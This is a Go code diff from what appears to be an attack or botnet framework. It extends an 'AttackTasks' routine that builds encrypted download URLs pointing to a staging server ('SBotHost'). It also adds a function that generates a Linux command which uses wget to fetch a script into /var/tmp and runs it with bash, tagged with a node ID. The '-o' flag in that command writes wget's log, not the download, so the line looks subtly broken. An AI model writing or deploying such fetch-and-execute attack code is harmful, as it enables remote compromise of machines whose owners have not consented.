@@ -126,6 +126,7 @@ func (at *AttackTasks) Start() {
 func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {
 
 	upc := &netutils.URLPathCrypt{
+		TaskId:       at.Cfg.TaskId,
 		Fname:        fname,
 		AttackType:   attackType,
 		AttackIP:     at.nodeInfo.IP,
@@ -136,4 +137,9 @@ func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackTy
 
 	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))
 
+}
+
+func (at *AttackTasks) InitCmdForLinux(initUrl string) string {
+
+	return fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh %s", initUrl, at.Cfg.NodeId)
 }
